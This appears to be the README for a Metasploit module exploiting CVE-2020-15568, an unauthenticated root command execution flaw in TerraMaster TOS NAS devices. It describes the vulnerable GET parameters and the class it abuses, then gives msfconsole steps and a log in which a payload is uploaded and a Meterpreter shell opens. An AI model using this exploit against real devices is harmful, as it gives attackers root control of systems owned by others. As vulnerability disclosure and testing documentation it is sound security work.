# TerraMaster TOS CVE-2020-15568
 Repository for CVE-2020-15568 Metasploit module

## Vulnerable Application

### Description

A dynamic class method invocation vulnerability exists in file include/exportUser.php which leads to executing remote commands on TerraMaster devices with root privileges.
The vulnerable file requires several HTTP GET parameters to be provided in order to reach method call and exploit this vulnerability. On first line application includes app.php which autoloads relevant core classes of TOS software.
The application decides operation based on value of GET parameter type. If value of type variable is something different than 1 or 2, then it’s possible to reach vulnerable code.
Source code of exportUser.php, application requires HTTP GET parameters cla (shorthand for class), func and opt.
        
During code review of other files as well, it has been found that there is a way to exploit this issue with pre-existing classes in TOS software.
PHP Class located in include/class/application.class.php is best candidate to execute commands on devices that runs TOS software.
Since exportUser.php has no authentication controls, it’s possible for unauthenticated attacker to reach code Execution

## Verification Steps

  1. Set-up your TerraMaster NAS with TOS version 4.1.24 or below
  2. Start msfconsole
  3. Do: `use exploit/multi/http/terramaster_command_exec`
  4. Do `set rhost 192.168.1.27`
  4. Do: `check`
```
[+] 192.168.1.27:80 - The target is vulnerable.
```

## Targets

```
Exploit targets:
   Id  Name
   --  ----
   0   Auto
```


## Scenarios
```
msf5 > use exploit/multi/http/terra_master_command_exec 
msf5 exploit(exploit/multi/http/terramaster_command_exec) > set rhost 192.168.1.27
rhost => 192.168.1.27
msf5 exploit(multi/http/terramaster_command_exec) > run
[+] Payload uploaded to /logs/FJETBHLL/.vatw.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 192.168.1.27:9090
[*] Sending stage (38288 bytes) to 192.168.1.27
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.1.27:9090) at 2020-07-23 09:49:34 +0300
meterpreter > 
